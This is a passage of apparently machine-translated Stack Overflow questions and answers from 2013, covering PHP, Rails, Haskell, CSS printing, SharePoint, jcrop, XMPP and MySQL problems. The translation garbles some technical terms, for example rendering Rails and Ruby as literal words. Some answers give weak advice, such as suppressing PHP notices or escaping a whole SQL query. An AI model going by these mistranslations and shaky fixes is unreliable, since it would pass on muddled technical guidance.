现在我的问题是：当我在移动设备上查看我的网站（[http://web3.server.e-astro.de](http://web3.server.e-astro.de) - 它的德语...）并点击一个链接时，我总是点击一个包含信息的子页面将菜单首先放在顶部，然后必须向下滚动才能找到真正的内容。解决方案是给内容链接一个类似的名称`"<a name="start"></a>`并直接链接到该名称。所以我并不总是把菜单放在上面。但我希望这只发生在移动版本上，而不是浏览器版本上。

所以我正在寻找这样的php代码：

```
<a href="site.php<?php IF ON MOBILE STYLESHEET VERSION echo '#start'; ELSE DO NOTHING ?>"> 
```

有人知道如何归档吗？我希望我说清楚了...

谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:18:09.040

您最好在设计中考虑移动导航；我喜欢的一种方法是让菜单以折叠格式加载到移动设备上，然后在点击时展开。这将允许导航可访问，而不会妨碍页面上的其余内容。

[Twitter Bootstrap](http://twitter.github.com/bootstrap/examples/starter-template.html)在框架的响应组件中为移动设备提供了非常棒的可折叠导航。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:24:35.460

CSS 不用于更改代码，它仅用于演示。要解决您的问题，您需要使用 PHP 检测用户设备，如果它是移动设备 - 您可以输出移动设备。

例如这个小类 - [Mobile Detect](https://github.com/serbanghita/Mobile-Detect)

```
include 'Mobile_Detect.php';
$detect = new Mobile_Detect();

if ($detect->isMobile()) {
    echo '#start';
} 
```

# ruby - 使用正则表达式将字符串拆分为单词

> ID：14903411
> 
> 赞同：-1
> 
> 时间：2013-02-15T21:14:25.523
> 
> 标签：ruby, regex

我需要一些帮助来理解以下用于将句子拆分为单词的 Ruby 代码。

```
class String
  def words
    scan(/\w[\w\'\-]*/)
  end
end 
```

这是实际的方法：

```
"This is a test of words' capabilities".words 
```

返回

```
["This", "is", "a", "test", "of", "words'", "capabilities"] 
```

正则表达式 (/\w[\w\'-]*/) 究竟是什么意思？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:23:12.370

基本上可以转化为：

> / : 表示正则表达式的开始
> \w : 找我一个单词字符 (通常是 [A-Za-z0-9_])
> [\w\'-]* : 然后找我零个或多个单词字符、撇号或破折号
> / : 表示正则表达式结束

Ruby 代码正在查找该表达式的所有匹配项（任何可以包含撇号和破折号但不能以它们开头的完整单词字符系列），并将其存储到找到的数组中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:24:13.743

我确定您可以找到[正则表达式](http://ruby-doc.org/docs/ruby-doc-bundle/Manual/man-1.4/syntax.html#regexp)文档。一个有用的资源，可以回答您的问题并总体了解更多信息！

# ruby-on-rails - 为什么 deploy:assets:precompile 失败并出现错误 uninitialized constant RAILS_ENV？

> ID：14903413
> 
> 赞同：1
> 
> 时间：2013-02-15T21:14:27.260
> 
> 标签：ruby-on-rails, capistrano, bundler

部署（到登台和生产，在同一台服务器上）错误：

```
 triggering after callbacks for `deploy:update_code'
  * executing `deploy:assets:precompile'
  * executing "cd /var/www/staging/releases/20130215205558 && bundle exec rake RAILS_ENV=staging RAILS_GROUPS=assets assets:precompile"
    servers: ["domain.com"]
    [domain.com] executing command
    [domain.com] cd /var/www/staging/releases/20130215205558 && bundle exec rake RAILS_ENV=staging RAILS_GROUPS=assets assets:precompile
 ** [out :: domain.com] rake aborted!
 ** [out :: domain.com] uninitialized constant RAILS_ENV
 ** [out :: domain.com] 
 ** [out :: domain.com] Tasks: TOP => environment
 ** [out :: domain.com] (See full trace by running task with --trace)
    command finished in 22567ms
*** [deploy:update_code] rolling back 
```

此应用程序正在运行：

*   导轨 3.1.4
*   红宝石 1.9.2-p290

deploy.rb 文件包含：

```
set :stages, %w(staging production)
require 'capistrano/ext/multistage'
require "bundler/capistrano"
set :application, "appname"
role :app, "domain.com"
role :web, "domain.com"
role :db,  "domain.com", :primary => true
set :scm, :git
set :repository, "git@git.git:username/appname.git"
set :deploy_via, :remote_cache
set :user, "username"
set :runner, "username"
set :use_sudo, false
set :shared_children, %w(system log pids spree)
default_run_options[:pty] = true
default_run_options[:shell] = false
require './config/boot'
require 'airbrake/capistrano'
load 'deploy/assets'
namespace :deploy do
  task :restart, :roles => :app do
    run "touch #{current_path}/tmp/restart.txt"
  end
  task :default do
    update
    restart
    cleanup
  end
  task :finalize_update, :except => { :no_release => true } do
    run "chmod -R g+w #{latest_release}" if fetch(:group_writable, true)
    run <<-CMD
      rm -rf #{latest_release}/log #{latest_release}/public/system #{latest_release}/tmp/pids &&
      mkdir -p #{latest_release}/public &&
      mkdir -p #{latest_release}/tmp &&
      ln -s #{shared_path}/log #{latest_release}/log &&
      ln -s #{shared_path}/system #{latest_release}/public/system &&
      ln -s #{shared_path}/spree #{latest_release}/public/spree &&
      ln -s #{shared_path}/pids #{latest_release}/tmp/pids
    CMD
    if fetch(:normalize_asset_timestamps, true)
      stamp = Time.now.utc.strftime("%Y%m%d%H%M.%S")
      asset_paths = fetch(:public_children, %w(images stylesheets javascripts)).map { |p| "#{latest_release}/public/#{p}" }.join(" ")
      run "find #{asset_paths} -exec touch -t #{stamp} {} ';'; true", :env => { "TZ" => "UTC" }
    end
  end
  end
end 
```

Gemfile 包含：

```
source 'http://rubygems.org'
gem 'rails', '~> 3.1'
gem 'spree', '~> 0.70.3'
gem 'tinymce-rails', '3.4.4'
gem 'honeypot-captcha'
gem 'spree_static_content', :git => 'https://github.com/spree/spree_static_content.git', :branch => '0-70-stable'
gem 'spree_editor', :git => 'https://github.com/commonmedia/spree_editor.git', :branch => 'master'
gem 'spree_contact_form', :git => 'git://github.com/commonmedia/spree-contact-form.git', :branch => 'master'
gem 'mysql2'
gem 'airbrake'
gem 'newrelic_rpm'
gem 'jquery-rails'
gem 'capistrano'
gem 'capistrano-ext'
group :assets do
  gem 'sass-rails',   '~> 3.1.5'
  gem 'coffee-rails', '~> 3.1.1'
  gem 'uglifier', '>= 1.0.3'
end
group :development do
  gem 'highline'
end
group :test do
  gem 'turn', '0.8.2', :require => false
end
group :development, :test do
  gem 'itslog'
end
group :staging, :production do
  gem 'therubyracer'
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:24:04.743

你的命令不正确。你应该改变：

```
bundle exec rake RAILS_ENV=staging RAILS_GROUPS=assets assets:precompile 
```

... 到：

```
RAILS_ENV=staging RAILS_GROUPS=assets bundle exec rake assets:precompile 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:23:28.230

这个错误的原因是我从 Rails 2 应用程序复制了一些[Errbit初始化程序的代码。](https://github.com/errbit/errbit)该初始化程序中的代码使用了`RAILS_ENV`，这实际上导致了各种问题。我没有意识到应用程序甚至没有启动，因为我从直接添加 Errbit 初始化程序到尝试部署它。

因此，在吸取的一些经验教训中，使用`Rails.env`而不是`RAILS_ENV`在 Rails 3 中。

# ios - iOS 和基本离线应用

> ID：14903416
> 
> 赞同：6
> 
> 时间：2013-02-15T21:15:03.553
> 
> 标签：ios, map, offline, mapbox

我知道 mapxbox/routeme 和 routeme，但我需要一些基本的东西。我需要一张包含所有国家的基本地图，唯一的细节是国家名称和边界。我可以用 mapbox 做到这一点吗？有没有更简单的方法来做到这一点？该应用程序应该离线并预加载地图。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-05-01T12:31:21.227

iOS 7 支持离线地图。

您只需要为特定区域添加瓷砖。

Tile 包含地图的叠加层，因此我们只需在地图上添加该叠加层。

对于瓷砖，您需要计算需要离线地图的区域，然后从[OpenStreetMaps](http://www.openstreetmap.org)获取该区域。

而已。

这是详细的[链接](http://www.viggiosoft.com/blog/blog/2014/01/21/custom-and-offline-maps-using-overlay-tiles/)教程。

从教程中获得想法后，您可以轻松理解地图结构并继续前进。

干杯。

# ruby-on-rails-3 - Find_by_sql 和计算字段

> ID：14903418
> 
> 赞同：3
> 
> 时间：2013-02-15T21:15:11.777
> 
> 标签：ruby-on-rails-3, activerecord

我正在使用查找我的 sql，我想在数据库中计算一些东西并添加到我的模型中。

我会尽量简化代码

```
class User < ActiveRecord::Base
   attr_accessor :comments_count

end 
```

在其他地方：

```
@users = User.find_by_sql("select * (select count(*) from comments where user_id=u.id) as comments_count from Users u")

@user.map{|u| puts u.comments_count} 
```

有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:16:50.800

好，我知道了。它与 attr_accessor 无关。我不得不删除它。

```
@users = User.find_by_sql("select * (select count(*) from comments where user_id=u.id) as comments_count from Users u")

@user.map do |u|
  puts u.comments_count if @user.has_attribute?(:comments_count)
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:34:49.187

不幸的是，ActiveRecord 不仅将任何选定的列与模型上的属性匹配。但是，类似的东西可能很容易组合在一起。首先你需要重载`find_by_sql`到这样的东西 -

```
def self.find_by_sql(sql)
    values = connection.select_all(sql)

    objects = []

    values.each do |row|
        objects << self.new(row)
    end

    objects
end 
```

然后，您的模型的初始化函数可以批量分配基于模式的属性，然后处理分配您的自定义属性。它不像您可能希望的那样干净或简单，但它应该可以完成任务。您可能可以编写初始化函数，使其相当通用，因为它可以批量分配所有基于模式的属性，然后将传入的剩余键与可能存在的任何属性匹配`self`。

# templates - 在脚手架模板中使用 gsp 导入

> ID：14903420
> 
> 赞同：1
> 
> 时间：2013-02-15T21:15:12.387
> 
> 标签：templates, grails, import, gsp, scaffold

有谁知道，如何在脚手架模板中转义如下导入？我想在我生成的视图中使用这个导入。

```
<%@ page import="nl.ihomer.enums.Status" %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T03:42:56.020

您无法逃避脚手架模板中的导入，因为该域位于不同的包中。如果您必须转义导入，则可以将“状态”替换为使用域的“nl.ihomer.enums.Status”。希望它可以帮助你！

# php - mysqli 数组无法正确打印值

> ID：14903421
> 
> 赞同：1
> 
> 时间：2013-02-15T21:15:17.310
> 
> 标签：php, sql, mysqli

我无法从我的 MySQLi 查询中打印出值。这是我正在使用的数据库连接类。

```
class db
{
 public function  __construct() 
    {
    $this->mysqli = new mysqli('localhost', 'root','', 'database');
    if (mysqli_connect_errno())
    {
        printf("Connect failed: %s\n", mysqli_connect_error());
        exit();
    }
}

public function Query($SQL)
{
    $this->SQL = $this->mysqli->real_escape_string($SQL);
    $this->Result = $this->mysqli->query($SQL);
    if ($this->Result == true)
    return true;
    else
    die('Problem with Query: ' . $this->SQL);
}

public function Get($field = NULL)
{
    if ($field == NULL)
    {
        $data = array();
        while ($row = $this->Result->fetch_assoc())
        {
            $data[] = $row;
        }
    }
    else
    {
        $row = $this->Result->fetch_assoc();
        $data = $row[$field];
    }

    $this->Result->close();
    return $data;
}

public function __destruct()
{
    $this->mysqli->close();
}
} 
```

运行查询

```
$db = new db;
$db->Query("SELECT * FROM tblclients WHERE clientid = $this->id");
$result = $db->Get();
echo $result['clientid']; 
```

我收到错误

```
PHP Notice:  Undefined index: clientid 
```

但是我知道当我运行时这些值被传递给 $results 数组

```
print_r ($result); 
```

我得到这个返回

```
Array ( [0] => Array ( [clientid] => 2 [firstname] => John [lastname] => Doe [dob] => 1962-05-08)) 
```

对于它的价值，如果我尝试`echo $db->Get('firstname');`一切正常。一段时间以来我一直把头撞在墙上，任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:17:55.250

如您所见，您在另一个数组中有一个数组。要得到你需要的东西，你需要这样做：

```
$result[0]['clientid']; 
```

因此，我们在这里所做的是您首先调用`$result`包含索引为 的数组的变量`[0]`，然后该数组包含查询中的列名（例如：`['clientid']`）。

因此，您基本上必须比`$result['clientid']`通过首先调用包含数据库中这些键的数组来从数据库中获取数据更深入。

要取消嵌套该数组，请执行以下操作：

```
$result = $db->Get();
$normal_result = 0;

foreach ($result as $value)
{
    $normal_result = $value;
} 
```

你可以在你的方法中使用它，这样你以后只会得到正常的结果。

# java - 服务器上很少使用安全管理器？

> ID：14903423
> 
> 赞同：1
> 
> 时间：2013-02-15T21:15:31.087
> 
> 标签：java, securitymanager

最近关于 SO 的一个[问题](https://stackoverflow.com/questions/14903318/how-to-prevent-accessing-private-variable-from-java-reflection)让我找到了关于 Java 安全管理器的旧[答案。](https://stackoverflow.com/a/2652651/18573)我在那个答案中关于这条线的问题：

> 安全管理器虽然会影响性能，但很少在服务器端使用。

有人可以支持或反驳吗？我认为*总是*有一个安全管理器，一个自定义的或默认的，并且容器一直使用它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:24:36.447

*在您*自己编写的服务器端代码中，我认为您不需要使用 SecurityManager，因为如果您正在编写代码以在应用程序中执行某些操作*，*则不太可能需要检查您的代码是否具有您授予它的权限。

例如，SecurityManager 中的很多方法都与 IO 操作相关 - `checkDelete()`, `checkRead()`,`checkWrite()`等。JDK 库类会在您尝试创建/写入/读取/删除文件时调用这些方法，因此您自己调用它们毫无意义.

因此，您的服务器端代码不太可能大量使用 SecurityManager。但是，运行您的代码的代码（例如，如果您部署在 servlet 容器中）可能会使用这些方法，因为它们有兴趣确定*您的*代码是否具有*他们*授予的某种级别的权限。

# haskell - 根据类型的具体性重构惰性列表？

> ID：14903425
> 
> 赞同：2
> 
> 时间：2013-02-15T21:15:35.240
> 
> 标签：haskell, lazy-evaluation, typeclass, monomorphism-restriction

我在 Haskell 中编写了一个简单（且不严重）的素数生成器，具有用于生成素数和确定数字的素数的相互递归定义：

```
primes :: (Integral a) => [a]
primes = 2 : filter isPrime [3, 5..]

isPrime :: (Integral a) => a -> Bool
isPrime m = all (indiv m) (takeWhile (<= (intSqrt m)) primes)

intSqrt :: (Integral a) => a -> a
intSqrt 1 = 1
intSqrt n = div (m + (div (n - 1) m)) 2
  where m = intSqrt (n - 1)

indiv :: (Integral a) => a -> a -> Bool
indiv m n = rem m n /= 0 
```

我注意到它似乎在每次引用时都重建了已经生成的素数的子列表`primes`：

```
*Main> take 200 primes
[2,3,5,7, ..., 1223]
(2.70 secs, 446142856 bytes)
*Main> take 200 primes
[2,3,5,7, ..., 1223]
(2.49 secs, 445803544 bytes) 
```

但是当我将类型注释更改为使用具体的整数类型时，例如

```
primes :: [Integer]
isPrime :: Integer -> Bool 
```

每个素数只生成一次：

```
*Main> :r
[1 of 1] Compiling Main             ( Primes.hs, interpreted )
Ok, modules loaded: Main.
*Main> take 200 primes
[2,3,5,7, ..., 1223]
(2.15 secs, 378377848 bytes)
*Main> take 200 primes
[2,3,5,7, ..., 1223]
(0.01 secs, 1626984 bytes) 
```

对我来说似乎很好奇。发生这种情况有什么特别的原因吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-15T21:23:18.703

当你说

```
primes :: [Integer] 
```

then`primes`是一个常数，但是当你说

```
primes :: (Integral a) => [a] 
```

那么它是一个带有隐藏参数的函数：`Integral`无论哪种类型的实例`a`。和其他函数一样，当你用相同的参数调用它时，它会重新计算它的结果（除非你明确地记住了它）。

# html - 用于打印 HTML 的不同页面方向

> ID：14903427
> 
> 赞同：21
> 
> 时间：2013-02-15T21:15:47.170
> 
> 标签：html, css

## 代码：

我尝试使以下简单的 HTML 页面工作：

```
<html>
  <head>
    <style type="text/css">     
    @media print
    {               
      @page port { size: portrait; }
      .portrait { page: port; }

      @page land { size: landscape; }
      .landscape { page: land; }                

      .break { page-break-before: always; }
    }
    </style>
  </head>
  <body>
    <div class="landscape">
      <p>This is a landscape page.</p>
    </div>
    <div class="portrait break">
      <p>This is a portrait page.</p>
    </div>
  </body>
</html> 
```

## 问题：

我想将第一个 div 的内容打印到第一页，横向，第二个纵向模式。但是，所有浏览器（Chrome、Opera、Safari、IE10）都会打印两个纵向页面。我错过了什么还是没有浏览器支持这种功能？在后一种情况下，是否有任何替代方法可以实现该结果？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-05-16T19:53:03.650

一个快速而肮脏的技巧是使用 CSS3 或过滤器将原本应处于横向的 div 旋转 90 度。以下将起作用：

```
-webkit-transform: rotate(-90deg);
-moz-transform:rotate(-90deg);
filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3); 
```

目前没有任何其他简单的方法可以做到这一点，因为`size`CSS 指令仅由一个浏览器 (Opera) 实现，但仍然是当前草案的一部分 ( [Is @Page { size:landscape} obsolete?](https://stackoverflow.com/questions/4249532/is-page-sizelandscape-obsolete) for deprecation , [http://www.w3.org/TR/css3-page/#page-size](http://www.w3.org/TR/css3-page/#page-size)用于规范）。

下一个最便宜的 hack 就是我上面提到的：将 HTML 放在肖像上……然后使用 CSS3 旋转 90 度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-16T21:58:39.763

该`size`属性（不再使用），所以我不会依赖它。最实用的方法是在打印之前在服务器上生成 PDF。

Seéastien 提供的旋转解决方案也可以使用，但只能在支持它的浏览器中使用。

# sharepoint - 将 C# 添加到自定义应用程序页面代码后未找到文件

> ID：14903428
> 
> 赞同：0
> 
> 时间：2013-02-15T21:15:55.380
> 
> 标签：sharepoint, sharepoint-2010

我在 SharePoint 2010 中有一个自定义应用程序页面。一切正常，直到我在后面的代码中放入一段 C# 代码。当我添加：

```
Document document = new Document();
document.LoadFromFile(@"C:\TestFolder\MYDOC.DOC");

document.SaveToFile(@"C:\Files\MYDOC.PDF", FileFormat.PDF); 
```

当我添加此代码时，我收到此错误：

```
File Not Found 
```

此自定义应用程序页面使用名为 Spire.Doc 的第三方 PDF dll。该 DLL 被添加到包中，并且即使 DLL 在包中，而上面的代码不存在，也不会出现错误。仅当上述代码位于自定义应用程序页面的代码中时，才会发生该错误。有任何想法吗？我完全被困住了。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T08:50:12.387

导致此错误的原因可能有很多。

首先尝试查看 SharePoint 日志，您可以在其中使用堆栈跟踪找到更多扩展诊断信息。它将允许您确定错误是由这段特定的代码引起的。

第二：确保您的文档确实存在于磁盘上。

第三：SharePoint 是一个复杂的系统，对其权限和角色的进入门槛很高。您（使用您的应用程序页面的帐户）应该有适当的权限来处理磁盘上的文件。检查应用程序页面的上下文 - 例如，当帐户在一个子站点中是管理员`http://root/sites/subsite`并导航到应用程序页面时，`http://root/_layouts/apppage`他可能不是根站点的管理员。无论如何，您可以尝试使用[提升的权限](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.spsecurity.runwithelevatedprivileges.aspx)调用您的代码。就像是

```
SPSecurity.RunWithElevatedPrivileges(delegate()
{
    Document document = new Document();
    document.LoadFromFile(@"C:\TestFolder\MYDOC.DOC");
    document.SaveToFile(@"C:\Files\MYDOC.PDF", FileFormat.PDF);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-05T12:10:23.250

根据我的经验，该`file not found`页面表明那里没有找到自定义错误页面。

就像 Oleg Savelyev 指出的那样，这可能是读取/写入本地磁盘的权限问题。

使用 Memorystream 显示或保存 PDF 文档可能是个好主意。

```
HttpContext.Current.Response.ClearContent();
HttpContext.Current.Response.ClearHeaders();
HttpContext.Current.Response.AddHeader("Content-Disposition", "inline;filename=MYDOC.PDF");
HttpContext.Current.Response.ContentType = "application/pdf";
HttpContext.Current.Response.WriteFile();
HttpContext.Current.Response.Flush();
HttpContext.Current.Response.Clear(); 
```

使用它来将 html 保存为 PDF。也可以处理 .doc 文件。如果不查看 [http://www.aspose.com/.net/word-component.aspx](http://www.aspose.com/.net/word-component.aspx)以获取 PDF 文件。

希望这会有所帮助。

# javascript - 使用 jcrop 裁剪带有预览的图像

> ID：14903431
> 
> 赞同：3
> 
> 时间：2013-02-15T21:16:12.787
> 
> 标签：javascript, html, css, jcrop

我正在使用 jcrop 并尝试对图像上的裁剪区域进行“实时”预览。

如果“裁剪选择”区域与目标预览 div 的高度和宽度相同，则所选区域的移动效果很好。

在这里查看问题：http: [//jsfiddle.net/fbaAW/](http://jsfiddle.net/fbaAW/)

```
function showCoords(c) 
{
    var $this = this.ui.holder;

    var original = $this.prev();
    var preview = original.parent().find(".image");

    var oH = original.height();
    var oW = original.width();

    var pH = preview.height();
    var pW = preview.width();

    var sH = c.h;
    var sW = c.w;

    var differenceH = pH - sH;
    var differenceW = pW - sW;

    //preview.css('width', c.w);
    //preview.css('height', c.h);

    //preview.css("background-size", Math.round(oW + differenceW) + "px" + " " + Math.round(oH + differenceH) + "px");

    preview.css("background-position", Math.round(c.x) * -1 + "px" + " " + Math.round(c.y) * -1 + "px");
} 
```

正如你所看到的，我已经注释掉了我的一些测试，并尝试让这段代码正常工作，但我无法理解位置和大小背景属性之间的关系以获得这种效果正常工作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-15T21:36:39.397

计算选择大小和预览区域大小之间的水平和垂直比例：

```
var rW = pW / c.w;
var rH = pH / c.h; 
```

然后将它们应用于`background-size`and `background-position`：

```
preview.css("background-size", (oW*rW) + "px" + " " + (oH*rH) + "px");
preview.css("background-position", rW * Math.round(c.x) * -1 + "px" + " " + rH * Math.round(c.y) * -1 + "px"); 
```

[http://jsfiddle.net/fbaAW/1/](http://jsfiddle.net/fbaAW/1/)

因此，如果预览大小是 jCrop 选择区域大小的 3 倍，则意味着您已将原始图像缩放 3 倍，并在定义背景位置时补偿缩放。

# ajax - ajax javascript函数刷新

> ID：14903433
> 
> 赞同：0
> 
> 时间：2013-02-15T21:16:17.467
> 
> 标签：ajax

我觉得我的问题很奇怪……我在这里学习，并想使用 AJAX & JSP 来按顺序显示其他一些 JSP 页面。即点击按钮：显示page1.jsp，再次点击按钮：显示page2.jsp，……</p>

我让 JSP 在页面后添加“1”，而 JSP 确实增加了变量。但它不会改变超过第 1 页的值...</p>

如果我执行 location.reload()，它会在函数中正确递增，但这当然会让我回到第一页……</p>

我确信还有其他方法可以做到这一点，但我只是希望它能够使用 JSP 来工作......任何想法

```
 <!DOCTYPE html>
<html>
<head>
<%! int n = 0;%>
<script>

function loadDoc() {
<% n = n+1; %>
var xmlhttp;

if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
    }
  }

xmlhttp.open("GET","page<%=n%>.jsp",true);
xmlhttp.send();
}
</script>
</head>
<body>
<div id="myDiv"><h2>Using AJAX to display next page</h2></div>
<button type="button" onclick="loadDoc()">Change Page</button>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:22:55.663

n 每次都是 0。你需要保存n。尝试使用

```
<input type="hidden" value="0" id="countvariable" /> 
```

在你的 html 某处。

然后在 loadDoc() 里面放

```
var n = 1 + parseInt(document.getElementById("countvariable").value);
document.getElementById("countvariable").value = n; 
```

这应该包含您的变量。此外，parseInt 是必须的，否则 javascript 会将 2 附加在一起，您将得到 10 作为 n 而不是 1。

更新：如果您想在一定数量的页面后返回，请将其添加到末尾。

```
if(n == 2)
{
   document.getElementById("countvariable").value = 0;
} 
```

# ios - 向多个目的地发送 XMPP 消息元素（Facebook 聊天 API）

> ID：14903437
> 
> 赞同：2
> 
> 时间：2013-02-15T21:16:39.260
> 
> 标签：ios, facebook, xmpp, chat, xmppframework

我在 iOS 应用程序中使用 Facebook 聊天 API。我已经可以成功地向 Facebook 朋友发送消息了。现在我想知道是否可以将相同的消息发送给多个收件人。

我不知道这在技术上是否可行或有任何限制。

我知道我可以为 N 个用户创建 N 条消息，并一条一条地发送。但根据用户可以选择的 Facebook 好友数量，可能需要很长时间才能将所有消息送达。如果这是唯一的情况，我是否应该为将要与 XMPP 流一起发送的每条消息打开一个不同的线程？

我很感激这个问题的任何解决方案或线索。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T06:34:46.590

有一个 XMPP 扩展[XEP-0033：Extended Stanza Addressing](http://xmpp.org/extensions/xep-0033.html)，它支持将消息多播到多个接收者。该扩展已进入草稿状态，但很少有 XMPP 服务器或客户端支持它。我怀疑 Facebook Chat 确实如此，并且在 XMPPFramework 源代码中找不到任何提及。

我认为没有比将同一消息发送给多个收件人更好的方法了。有些服务器可能会要求您在发送大量相同消息之间暂停，如果 Facebook 聊天也是如此，我不会感到惊讶。

多用户聊天是使用 XMPP 实现此目的的另一种方式，但不幸的[是 Facebook 聊天不支持 MUC](https://stackoverflow.com/questions/14175899/facebook-chat-rooms-using-xmpp)。

# php - 为什么忽略 header() 函数我的方法的结果？

> ID：14903438
> 
> 赞同：0
> 
> 时间：2013-02-15T21:16:42.943
> 
> 标签：php, pear

```
$result = $mail->send($recipient, $headers, $html);
    if($result === 1)
    {
        $report= "1";
        header("Location: objednavka.php?reaction=".$report);
      //echo("Your message has been sent!");
    }
    else
    {
        $report= "2";
        header("Location: objednavka.php?reaction=".$report);
      //echo("Your message was not sent: " . $result);
    } 
```

如果此邮件功能运行到 if 语句，则决定它是否成功。如果我使用 echo() 部分，它会写出您的消息已发送。但是如果我想将用户重定向到另一个页面它不起作用。为什么？如何成功调用标头函数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:19:18.787

您忘记设置相应的状态码 ( [`header()`](http://php.net/header))

```
header("Location: objednavka.php?reaction=$report", true, 301); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:19:22.050

从[PHP - header()](http://www.php.net/manual/en/function.header.php)：

*请记住，必须在发送任何实际输出之前调用 header()，无论是通过普通 HTML 标记、文件中的空白行还是从 PHP 发送。*

# php - Wordpress 主题错误通知：未定义索引：已激活

> ID：14903439
> 
> 赞同：0
> 
> 时间：2013-02-15T21:16:44.347
> 
> 标签：php, wordpress, function

当我的页面在 wordpress 中加载时，我收到以下错误。我怎样才能防止这种情况？

```
Notice: Undefined index: activated in /home3/answ/public_html/wp-content/themes/tipztheme/functions.php on line 582

Notice: Undefined index: preview in /home3/answ/public_html/wp-content/themes/tipztheme/functions.php on line 582 
```

这是导致错误的第 508 行代码。第 508 行 `if ( $_GET['activated'] == 'true' || $_GET['preview'] == 1 )` 非常感谢您的帮助！

```
 Plugin Name: DDThemes - Logo Options
 Plugin URI: http://www.designdisease.com/
 */

 //ADD OPTION PAGE
 add_action('admin_menu', 'ddthemes_admin');

 //UPON ACTIVATION OR PREVIEWED
 if ( $_GET['activated'] == 'true'  || $_GET['preview'] == 1 )
 {
ddthemes_setup();
 }

 function ddthemes_admin() 
 {
    /* PROCESS OPTION SAVING HERE */
if ( 'save' == $_REQUEST['action'] ) 
{
    if ( $_REQUEST['savetype'] == 'header' )
    {
        update_option( 'ddthemes_header', $_REQUEST['ddthemes_header']);
    }

}

/* SHOW THEME CUSTOMIZE PAGE HERE */
add_theme_page(__('Logo Options'), __('Logo Options'), 'edit_themes', basename(__FILE__), 'ddthemes_headeropt_page');} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T01:19:27.863

出现此错误是因为您的 PHP 错误报告设置。当您的变量设置不正确时会出现。老实说，这并不是什么大问题，这很好；=）要解决它，您有几个选择：选项一是在使用之前设置变量并为其添加一些虚拟值，例如：

```
 if (!isset($_REQUEST['savetype']))
  {
  //If not set add some dummy value
  $_REQUEST['savetype'] = "undefine";
  } 

  if ( $_REQUEST['savetype'] == 'header' )
  {
    update_option( 'ddthemes_header', $_REQUEST['ddthemes_header']);
  } 
```

另一种解决方案是在您的**php.ini**中修改（抑制错误报告）并插入以下行：

```
<?php error_reporting (E_ALL ^ E_NOTICE); ?> 
```

还有另一个解决方案是抑制错误报告，但这次在你的**wp-config.php**中而不是这个：`define('WP_DEBUG', true);`添加`define('WP_DEBUG', false);`

有趣的是我今天遇到了同样的问题，第一个选项对我有用：）希望它有帮助......干杯！

# javascript - 为特定时间段重定向页面

> ID：14903442
> 
> 赞同：0
> 
> 时间：2013-02-15T21:16:54.050
> 
> 标签：javascript

我正在尝试创建一个 302 重定向，它在重定向后等待 18 秒，然后返回到父页面。

这是我所做的，

```
<script type='text/javascript'>
(function (){
 if (document.cookie.indexOf(welcomeCookie) != -1 ||
     document.cookie.indexOf(dailyWelcomeCookie) != -1
 ){
    document.cookie="toURL"+ "=" +escape(document.URL)+";path=/; domain=.forbes.com";
    document.cookie="refURL"+ "=" +escape(document.referrer)+";path=/; domain=.forbes.com";
    this.location="http://www.forbes.com/fdc/welcome_mjx.shtml";
 })();
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:28:14.437

在我看来，您需要先重定向用户，而您似乎知道该怎么做。但是，一旦用户被重定向到目标页面，该目标页面将需要一些 JavaScript 才能将用户发送到父页面。下面是一些简单的 JavaScript 代码，可以根据上面的代码执行您需要的操作：

```
<script type='text/javascript'>
(function (){
if (document.cookie.indexOf(welcomeCookie) != -1 ||
    document.cookie.indexOf(dailyWelcomeCookie) != -1
){
    document.cookie="toURL"+ "=" +escape(document.URL)+";path=/; domain=.forbes.com";
    document.cookie="refURL"+ "=" +escape(document.referrer)+";path=/; domain=.forbes.com";

    // wait 18 seconds then go to the specified page. 18000 milliseconds == 18 seconds
    setTimeout(function(){
        this.location="http://www.forbes.com/fdc/welcome_mjx.shtml";            
    }, 18000); 
})();
</script> 
```

# mysql - 在 mysql 上运行常见的“alter table”命令返回“未选择数据库”错误

> ID：14903460
> 
> 赞同：3
> 
> 时间：2013-02-15T21:18:04.020
> 
> 标签：mysql, wordpress, alter

我正在尝试通过修改所有表以使用 utf8 来解决一些 Wordpress 字符编码问题。但是我使用的命令不起作用。

命令：

```
ALTER TABLE tbl_name CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci; 
```

错误：

> 错误 1046 (3D000): 未选择数据库

这似乎对每个人都有效。我究竟做错了什么？

